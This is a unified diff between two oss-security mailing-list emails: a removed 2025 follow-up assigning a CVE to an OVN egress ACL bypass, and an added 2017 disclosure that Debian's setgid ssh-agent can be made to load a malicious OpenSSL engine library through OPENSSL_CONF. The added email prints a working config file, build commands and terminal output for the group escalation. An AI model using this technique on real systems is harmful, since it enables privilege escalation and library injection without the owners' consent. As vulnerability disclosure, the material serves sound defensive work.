@@ -1,4 +1,9 @@
-Received: (qmail 26154 invoked by uid 550); 22 Jan 2025 19:15:40 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["8574" "Monday" "25" "December" "2017" "12:01:13" "+0000" "halfdog" "me@halfdog.net" "<1551-1514203273.928126@aiRv.IBNV.Miod>" "256" "[oss-security] Gain Access to SSH Group via ssh-agent and OpenSSL" "^Date:" nil nil "12" "2017122512:01:13" "[oss-security] Gain Access to SSH Group via ssh-agent and OpenSSL" (number mark "        me@halfdog.n Dec 25  256/8574  " thread-indent "\"[oss-security] Gain Access to SSH Group via ssh-agent and OpenSSL\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 13547 invoked by uid 550); 25 Dec 2017 12:02:38 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,169 +11,270 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 9716 invoked from network); 22 Jan 2025 18:56:46 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-	s=mimecast20190719; t=1737572198;
-	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-	 to:to:cc:mime-version:mime-version:content-type:content-type:
-	 content-transfer-encoding:content-transfer-encoding:
-	 in-reply-to:in-reply-to:references:references;
-	bh=dS2wHG1LWKhdnC3vMORBN37MxaiWHBaAWO4DNgbFS4U=;
-	b=YFdA3pMY4tFC/sySk+pP21e18SujSDW7rkPUpqpFdiNUuqKv66fvd1a0Oypu50k25CRBmU
-	qcVrwGWkzoDUWqhmbprDXhI5opqPNFIxFzEFWAneDe1Y5y8vkVh9MhTlY5WW3YFMcU+wza
-	CMBJw7VIggtC9DnCj7NF4MBDQp/ybO8=
-X-MC-Unique: fG5shvRkPY2nQedml2e96Q-1
-X-Mimecast-MFC-AGG-ID: fG5shvRkPY2nQedml2e96Q
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1737572196; x=1738176996;
-        h=content-transfer-encoding:in-reply-to:content-language:references
-         :to:from:subject:user-agent:mime-version:date:message-id
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
-        bh=dS2wHG1LWKhdnC3vMORBN37MxaiWHBaAWO4DNgbFS4U=;
-        b=dzlk1eSh1Ybxj1BoSVzevik2hTBeBB6vtVr9zA+rDCqgg++zXBonhPFdP2eQMpZpjq
-         gf5NfbGRSNvmmXAv8vThjshRu7+PGGXxKb/H1xtfa8HucZQxSOcsS/R2CKJJv9BiFV19
-         mHjCKGggiPX5zMpVenZx61Q1b/WvCdTemcwrYBAyYeDIr1ri+7MPwC+o84A2tJ5yGcxK
-         7EPoaGwtojDUBLFkNFs48+7I+Lzo0zU1mBXBTwzepA+ZQBk0itJRUl2ff+neRETlaBHX
-         LKyl7BlB8Ws9iaFvVaFigyOdiBC9jBpEmN9cfAWKb8oF8/aHg1cKPO8dsSZu43RbYNUg
-         1C2A==
-X-Gm-Message-State: AOJu0YwAzYawXaQTvw+mEdjZK1V5K/o2A8Vgkv0el1KCUlWpGKX/w1er
-	duKHWX21XxiyQyCmbd//HUNlPfb1wOJkO2MRYpXOTBwRam37DUzAclPnfXnqn622BSELbCazVye
-	ww+aMMtTk+0P+g0sOh7HtjF3t8sIIf50zdaXDiV1bCrUf5cywglePbJ3XidHPsFRcd6NZbR3TbI
-	L5o3vFOiTPkInmcDRZNpK2mKwPbuWzoeMIKX86lFG5yrgCXYHV2Q==
-X-Gm-Gg: ASbGncso0h0uz/eSJYHnOi0LQ+QKw3NEQGYLFe3891dYCktm5joYJZPPvqhJLWufm6Q
-	6B2GWgFrM2JtS57qKdIfIWCLqqA2tp1Ue/BBeFdZg2AFiqPH+Bzd8eqqvf3dAzhOc03Kyg1TN0u
-	pjg+HsYpwCxaSCPCpbVgXk9/nYvlANv2wogq/ItKsyTPAGT3Y7mYVQVYyfwvj6lsIt1CiO9xpJh
-	Lww8ALJrJ1TK8fcOt849aSvSU3nEfL6KGjQ53EKyrPPx8vm4cGEqoKZVE5Qn8L1BG/g/TaeYg==
-X-Received: by 2002:a05:690c:b82:b0:6ef:60db:5e8d with SMTP id 00721157ae682-6f6eb65894bmr155610687b3.4.1737572195701;
-        Wed, 22 Jan 2025 10:56:35 -0800 (PST)
-X-Google-Smtp-Source: AGHT+IFKTg9Nr25iO/pkaCgPgFv0qmf6uQfkst8IrGcN1Sj49bTK9NNUzntDBUN+RdCgonaNhjWQjQ==
-X-Received: by 2002:a05:690c:b82:b0:6ef:60db:5e8d with SMTP id 00721157ae682-6f6eb65894bmr155610307b3.4.1737572195091;
-        Wed, 22 Jan 2025 10:56:35 -0800 (PST)
-Message-ID: <90517d36-940a-42c3-904e-286bf2a0d98f@redhat.com>
-Date: Wed, 22 Jan 2025 13:56:34 -0500
+Received: (qmail 13513 invoked from network); 25 Dec 2017 12:02:37 -0000
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-From: Mark Michelson <mmichels@redhat.com>
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
+Message-ID: <1551-1514203273.928126@aiRv.IBNV.Miod>
+Date: Mon, 25 Dec 2017 12:01:13 +0000
+From: halfdog <me@halfdog.net>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] Gain Access to SSH Group via ssh-agent and OpenSSL
 To: oss-security@lists.openwall.com
-References: <24e58df0-1efb-4832-b71c-a8548c4cdae0@redhat.com>
-In-Reply-To: <24e58df0-1efb-4832-b71c-a8548c4cdae0@redhat.com>
-X-Mimecast-Spam-Score: 0
-X-Mimecast-MFC-PROC-ID: AaAn5bFKqGRxzIVKSuLGBDbLVim14DBfhgPsmF4LZsA_1737572196
-X-Mimecast-Originator: redhat.com
-Content-Language: en-US
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 8bit
-Subject: [oss-security] Re: Open Virtual Network egress access control list bypass.
 
-On 1/21/25 21:00, Mark Michelson wrote:
-> Note: This release had to be fast-tracked because the security issue was 
-> made public before an embargo could be lifted. We are awaiting a CVE 
-> assignment and will update this advisory with the CVE number once it is 
-> assigned.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
 
-CVE-2025-0650 has been assigned to this vulnerability.
+Hello List,
 
-> 
-> Description
-> ===========
-> Multiple versions of OVN (Open Virtual Network) are vulnerable to 
-> allowing crafted UDP packets to bypass egress access control list (ACL) 
-> rules. This can result in unauthorized access to virtual machines and 
-> containers running on the OVN network.
-> 
-> OVN provides rudimentary DNS caching as an optional feature to speed up 
-> lookups of frequently-used domains. When this feature is enabled, due to 
-> the OpenFlow rules that OVN installs in Open vSwitch, it is possible for 
-> an attacker to craft a UDP packet that can bypass egress ACL rules. 
-> Egress ACL rules are those that have the "direction" set to "to-lport".
-> 
-> The OVN installation is vulnerable if a logical switch has DNS records 
-> set on it AND if the same switch has any egress ACLs configured on it. 
-> The switch is considered to have egress ACLs configured if the switch 
-> has an egress ACL configured directly on it using the "acls" column of 
-> the logical switch. A switch is also considered to have egress ACLs 
-> configured if any of its logical switch ports are part of a port group 
-> that has egress ACLs configured in its "acls" column.
-> 
-> A python script (vuln_test.py) is attached to this advisory and can be 
-> used to determine if your installation is vulnerable. Run it in a 
-> location where "ovn-nbctl" is installed and can access the northbound 
-> database. The script will print to the console whether the installation 
-> is vulnerable.
-> 
-> Mitigation
-> ==========
-> If the DNS records being used in OVN are accessible over the internet 
-> without using the built-in cache, then DNS caching can be disabled in 
-> OVN by clearing the "dns_records" column of all logical switches in the 
-> northbound database. Here is a command that can be used to accomplish this:
-> 
-> $ for s in $(ovn-nbctl list logical_switch | grep uuid | cut -f 2 -d 
-> ':') ; do ovn-nbctl clear logical_switch "$s" dns_records ; done
-> 
-> Doing this will incur a latency penalty for DNS lookups since the lookup 
-> will be carried out over the internet instead of being looked up in a 
-> local cache.
-> 
-> If OVN's DNS caching is required on the deployment, then a second 
-> mitigation might be to adjust ACLs from being evaluated on egress to 
-> being evaluated on ingress. ACLs whose "direction" column is set to 
-> "to-lport" are evaluated on egress and are vulnerable to being bypassed 
-> if OVN's DNS caching is enabled. ACLs whose "direction" column is set to 
-> "from-lport" are evaluated on ingress and are not vulnerable to being 
-> bypassed if OVN's DNS caching is enabled. An ACL can be evaluated on 
-> ingress as long as it does not attempt to match on the "outport" field. 
-> Ingress ACLs are capable of matching based on the results of load 
-> balancing if "options:apply-after-lb" is set to "true".
-> 
-> There is no one-size fits all command line solution for changing egress 
-> ACLs to ingress ACLs. Each ACL rule will need to be evaluated and 
-> changed over if possible.
-> 
-> If DNS caching is required and egress ACLs are required, then the only 
-> mitigation is to adjust the topology of the virtual network so that DNS 
-> caching and egress ACLs are not on the same logical switch.
-> 
-> Fix
-> ===
-> Patches to fix this vulnerability in currently supported versions of OVN 
-> are as follows:
-> 
-> * 22.03.x: 
-> https://github.com/ovn-org/ovn/commit/f22a1ba9c127795bebcfbd41d772bb071f893a6d
-> * 24.03.x: 
-> https://github.com/ovn-org/ovn/commit/70618a65fd49f1d1d5498927c0bed63e296dafb7
-> * 24.09.x: 
-> https://github.com/ovn-org/ovn/commit/249c52ad011cacb4c182dc64e88977ac7c61f668
-> 
-> The original patch is located at:
-> https://mail.openvswitch.org/pipermail/ovs-dev/2025-January/419993.html
-> 
-> Recommendation
-> ==============
-> We recommend that users of OVN apply the linked patches, or upgrade to a 
-> known patched version of OVN. These include:
-> 
-> v22.03.8
-> v24.03.5
-> v24.09.2
-> 
-> Acknowledgments
-> ===============
-> 
-> The OVN team wishes to thank the reporters:
-> 
->       Marius Berntsberg - marius@redpill-linpro.com
->       Trygve Vea - tv@redpill-linpro.com
->       Tore Anderson - tore@redpill-linpro.com
->       Rodolfo Alonso - ralonsoh@redhat.com
->       Jay Faulkner (Openstack VMT) - jay@jvf.cc
->       Brian Haley (Openstack/Neutron) - haleyb.dev@gmail.com
-> 
-> In addition, a special acknowledgment is due to the Firewall 
-> Misconfiguration security research team at the University of California, 
-> Riverside - firewallresearch@ucr.edu - 
-> https://firewall-research.cs.ucr.edu/misconfiguration/
+This seems to be just a funny bug and no security problem, as
+discussed on open[ssh/ssl]-security. As the sum of knowledge held
+by a community is more than the parts, public should allow search
+for better solution, thus avoiding an implementation with side
+affectects causing more severe troubles in future. Read more at
+
+http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/
+
+hd
+
+
+<-- Created by SecurityReportToText.xsl V20121225 -->
+
+Gain Access to SSH Group via ssh-agent and OpenSSL
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+=3D=3D=3D Introduction =3D=3D=3D
+
+
+=3D Problem description: =3D: On Debian, /ssh-agent/ is a set-group-id
+binary with a nice feature to gain access to that group and execute
+arbitrary code via included openssl library. Usually that would
+be quite a bad security vulnerability, but at least for ssh-agent,
+this is just a funny bug or unexpected behaviour. According to
+man-pages:
+
+************************************************************
+ssh-agent is a program to hold private keys used for public key
+authentication (RSA, DSA, ECDSA, Ed25519). ssh-agent is usually
+started in the beginning of an X-session or a login session, and
+all other windows or programs are started as clients to the ssh-agent
+program. Through use of environment variables the agent can be
+located and automatically used for authentication when logging
+in to other machines using ssh(1).
+************************************************************
+
+
+The reason for ssh-agent being a SGID binary is also given
+in the man pages:
+
+************************************************************
+In Debian, ssh-agent is installed with the set-group-id bit set,
+to prevent ptrace(2) attacks retrieving private key material....
+************************************************************
+
+
+As ssh-agent is handling private key material, it uses the
+/libcrypto.so/ from /libssl/ package for cryptography
+related operations. To support integration of non-standard ciphers
+or cryptohardware, openssl is very flexible regarding its configuration.
+- From the /openssl (1)/ man page:
+
+************************************************************
+Many commands use an external configuration file for some or all
+of their arguments and have a -config option to specify that file.
+The environment variable OPENSSL_CONF can be used to specify the
+location of the file. If the environment variable is not specified,
+then the file is named openssl.cnf in the default certificate
+storage area ...
+************************************************************
+
+
+Most interesting feature of the configuration is, that it supports
+loading of shared libraries from non-standard locations using
+the /dynamic_path/ configuration setting.
+
+
+=3D=3D=3D Methods =3D=3D=3D
+
+
+To elevate privileges, mahe ssh-agent use a crafted openssl
+configuration via the /OPENSSL_CONF/ environment variable
+and let it point to a file containing library loading instructions,
+e.g. "load.conf" [idm38]:
+
+************************************************************
+# See http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/
+# Copyright (c) 2017 halfdog <me (%) halfdog.net>
+openssl_conf =3D openssl_def
+
+[openssl_def]
+engines =3D engine_section
+
+[engine_section]
+pkcs11 =3D pkcs11_section
+
+[pkcs11_section]
+engine_id =3D pkcs11
+dynamic_path =3D /tmp/engine.so
+default_algorithms =3D ALL
+init =3D 1
+************************************************************
+
+
+The /engine.so/ is a standard shared object, that will
+be loaded using /dlopen/ when the SSL engine is initialized.
+"engine.c" [idm43] will just change /gid/ to
+/egid/ and run //bin/sh/.
+
+************************************************************
+$ gcc -Wall -fPIC -c engine.c
+$ id
+uid=3D1000(test) gid=3D100(users) groups=3D100(users)
+$ ld -shared -Bdynamic engine.o -L/lib -lc -o engine.so
+$ cp engine.so load.conf /tmp
+$ OPENSSL_CONF=3D/tmp/load.conf /usr/bin/ssh-agent
+TestLib.c: Within _init
+Process uid/gid at load: 1000/1000/1000 100/100/112
+Process uid/gid after change: 1000/1000/1000 112/112/112
+$ id
+uid=3D1000(test) gid=3D112(ssh) groups=3D112(ssh),100(users)
+************************************************************
+
+
+
+
+=3D=3D=3D Results, Discussion =3D=3D=3D
+
+
+=3D Openssl code: =3D: Openssl openssl-1.1.0
+contains some code intended to protect against such attacks, see
+/crypto/uid.c/:
+
+************************************************************
+int OPENSSL_issetugid(void)
+{
+    if (getuid() !=3D geteuid())
+        return 1;
+    if (getgid() !=3D getegid())
+        return 1;
+    return 0;
+}
+************************************************************
+
+
+But this code is only active to disallow gaining randomness
+from weak sources in SUID-binaries, see /crypto/rand/randfile.c/:
+
+************************************************************
+    if (OPENSSL_issetugid() !=3D 0) {
+        use_randfile =3D 0;
+    } else {
+        s =3D getenv("RANDFILE");
+        if (s =3D=3D NULL || *s =3D=3D '\0') {
+            use_randfile =3D 0;
+            s =3D getenv("HOME");
+        }
+    }
+************************************************************
+
+
+In /char *CONF_get1_default_config_file(void)/ plain getenv()
+is used:
+
+************************************************************
+char *CONF_get1_default_config_file(void)
+{
+    char *file;
+    int len;
+
+    file =3D getenv("OPENSSL_CONF");
+    if (file)
+        return OPENSSL_strdup(file);
+...
+************************************************************
+
+=3D Impact on Debian/ssh-agent: =3D: Here the impact is very limited: the S=
+GID
+binary is just here to avoid ptracing for key extraction. With
+standard settings, even after gaining access to the group, the
+process will still not be able to read the memory content of an
+running ssh-agent.
+
+
+=3D Impact on Debian/ssh-keysign: =3D: The binary //usr/lib/openssh/ssh-key=
+sign/
+is a SUID binary, but does not access the configuration environment
+variable, thus no local-root-privilege escalation is possible.
+The reason for that is not fully analyzed yet.
+
+
+=3D Impact in general: =3D: The openssl engine loading allows to inject
+arbitrary libraries during SSL engine initialization and therefore
+might come in handy bypassing security restrictions in general
+or to backdoor security software in specific.
+
+
+=3D Other SSL implementations: =3D: At the moment, it is not known, if other
+SSL libraries have copied the environment-configuration pattern
+or have similar vulnerabilities not related to code duplication.
+At the moment one implementation is already confirmed to have
+anticipated the risks of environment variable use beforehand.
+_Not affected:_
+
+* _libressl_: Code was removed, see comments from "libressl lead developer =
+Theo de Raadt" [idm78], info on "commits" [idm79]
+
+
+=3D=3D=3D Open Questions =3D=3D=3D
+
+
+Theo de Raadt also pointed out:
+/I think older versions of openssl didn't inspect that environment
+variable during a constructor, but only in active code.  So
+applications could clean the environment space themselves.
+I'm wondering if some systems run with openssl which doesn't take
+the constructor approach.../
+Maybe this is related to the reason why /ssh-agent/ is affected
+but /ssh-keysign/ is not.
+
+
+=3D=3D=3D Timeline =3D=3D=3D
+
+
+
+* 20170608: Discovery
+* 20171217: Report to openssh/openssl security
+* 20171225: Opening of public discussion
+
+
+=3D=3D=3D Material, References =3D=3D=3D
+
+
+
+* My recommendations for a fix as "mail" [idm101]
+
+>>> Last modified 20171225
+Contact e-mail: me (%) halfdog.net <<<
+
+* [idm38] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/=
+load.conf
+* [idm43] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/=
+engine.c
+* [idm48] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/=
+engine.c
+* [idm78] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/=
+20171217-TheoDeRaadt-RePrivilegeEscalationToGroupSshInSshAgentViaOpensslLib=
+rary.eml
+* [idm79] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/=
+20171219-TheoDeRaadt-LibresslCommitsAroundGetenv.eml
+* [idm101] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges=
+/201712192246-MailToOpenSshSslLists-RecommendationsForFix.eml
+-----BEGIN PGP SIGNATURE-----
+
+iF0EAREKAB0WIQQVaq6YuR8BFP6IK9jEWZOG/u2r7gUCWkDb5QAKCRDEWZOG/u2r
+7n1mAJ4mnA5ze2v0i9Q+plzicIm0mgzP3QCfbfbzmK5ilojqO1PtXbALiVWbFWM=3D
+=3DYui+
+-----END PGP SIGNATURE-----
+
 
